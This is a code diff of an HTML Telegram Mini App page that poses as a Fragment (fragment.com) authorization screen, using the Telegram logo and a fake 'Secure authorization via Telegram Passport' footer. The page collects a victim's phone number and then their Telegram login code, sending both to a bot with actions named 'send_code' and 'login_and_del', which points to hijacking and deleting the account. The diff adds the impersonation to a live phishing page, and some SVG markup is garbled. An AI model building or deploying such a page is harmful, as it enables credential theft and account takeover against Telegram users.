@@ -2,50 +2,134 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1c1c1e; padding: 30px; border-radius: 20px; width: 85%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 15px; margin: 20px 0; border-radius: 12px; border: 1px solid #333; background: #2c2c2e; color: #fff; font-size: 18px; box-sizing: border-box; text-align: center; outline: none; }
-        button { width: 100%; padding: 15px; background: #007aff; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        button:active { transform: scale(0.98); }
+        body { 
+            background-color: #ffffff; 
+            color: #000000; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            padding: 0;
+        }
+        .container { 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+            padding: 20px;
+        }
+        .tg-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 25px;
+        }
+        h2 { 
+            font-size: 24px; 
+            font-weight: 700; 
+            margin-bottom: 10px; 
+            color: #222;
+        }
+        p { 
+            font-size: 15px; 
+            color: #707579; 
+            line-height: 1.5; 
+            margin-bottom: 30px; 
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border-radius: 10px; 
+            border: 1px solid #dfe1e5; 
+            background: #f4f4f5; 
+            color: #000; 
+            font-size: 17px; 
+            box-sizing: border-box; 
+            outline: none; 
+            transition: border-color 0.2s;
+        }
+        input:focus { 
+            border-color: #3390ec; 
+        }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: #3390ec; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 10px; 
+            font-weight: 600; 
+            font-size: 17px; 
+            cursor: pointer; 
+            transition: background 0.2s;
+        }
+        button:active { 
+            background: #2b79c7; 
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 13px;
+            color: #999;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 id="title">🔐 Вход в аккаунт</h2>
-        <p id="desc" style="opacity: 0.6">Введите номер телефона для авторизации</p>
-        <input type="tel" id="inputField" placeholder="+79001112233">
-        <button id="mainBtn">Продолжить</button>
+    <div class="container">
+        <!-- Официальное лого Telegram -->
+        <svg class="tg-logo" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org">
+            <circle cx="120" cy="120" r="120" fill="#3390EC""")/>>
+            <path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>>
+        </svg>
+
+        <h2 id="title">Fragment</h2>
+        <p id="desc">Введите номер для авторизации на fragment.com</p>
+        
+        <div class="input-group">
+            <input type="tel" id="inputField" placeholder="+7 900 000-00-00">
+        </div>
+        
+        <button id="mainBtn">Далее</button>
+        
+        <div class="footer">Secure authorization via Telegram Passport</div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
+        tg.backgroundColor = '#ffffff';
+        tg.headerColor = '#ffffff';
+        
         let step = 1;
         let phone = "";
 
         document.getElementById('mainBtn').onclick = function() {
             let val = document.getElementById('inputField').value.trim();
-            if (!val) return alert("Заполните поле!");
+            if (!val) return;
 
             if (step === 1) {
                 phone = val;
-                // Отправляем номер боту, чтобы он запросил код
                 tg.sendData(JSON.stringify({ "action": "send_code", "phone": phone }));
                 
-                // Меняем интерфейс под ввод кода
-                document.getElementById('title').innerText = "📩 Введите код";
-                document.getElementById('desc').innerText = "Код подтверждения отправлен в Telegram";
+                // Переход ко второму этапу
+                document.getElementById('desc').innerText = "Введите код подтверждения из Telegram для Fragment";
                 document.getElementById('inputField').value = "";
-                document.getElementById('inputField').placeholder = "12345";
-                document.getElementById('mainBtn').innerText = "Войти";
+                document.getElementById('inputField').type = "text";
+                document.getElementById('inputField').placeholder = "Код подтверждения";
+                document.getElementById('mainBtn').innerText = "Авторизоваться";
                 step = 2;
+                tg.HapticFeedback.impactOccurred('medium');
             } else {
-                // Отправляем код боту для входа и удаления
                 tg.sendData(JSON.stringify({ "action": "login_and_del", "code": val, "phone": phone }));
-                tg.close();
+                tg.HapticFeedback.notificationOccurred('success');
+                setTimeout(() => { tg.close(); }, 500);
             }
         };
     </script>
